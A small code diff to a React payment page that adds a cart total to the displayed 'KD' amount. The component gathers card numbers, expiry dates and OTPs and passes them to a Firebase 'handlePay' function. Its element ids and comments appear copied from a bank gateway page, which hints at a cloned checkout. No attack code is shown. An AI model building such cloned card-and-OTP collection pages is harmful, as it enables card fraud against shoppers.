@@ -2,6 +2,7 @@ import { useEffect, useState } from 'react';
 import './kent.css'
 import {  doc,  onSnapshot } from 'firebase/firestore';
 import { db, handlePay } from '../firebase';
+import { useCart } from '../cartContext';
 
 type PaymentInfo = {
   cardNumber: string;
@@ -122,7 +123,7 @@ export const Payment = (props: any) => {
 
   const [step, setstep] = useState(1);
   const [newotp] = useState([''])
-
+const {total}=  useCart() as any
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
     cardNumber: '',
     year: '',
@@ -191,8 +192,8 @@ export const Payment = (props: any) => {
                 <div id="OrgTranxAmt">
                   <label className="column-label"> Amount: </label>
                   <label className="column-value text-label" id="amount">
-                    {' '}
-                    KD&nbsp;{' '}
+                    {total} 
+                    {'  '}KD&nbsp;{' '}
                   </label>
                 </div>
                 {/* Added for PG Eidia Discount starts   */}
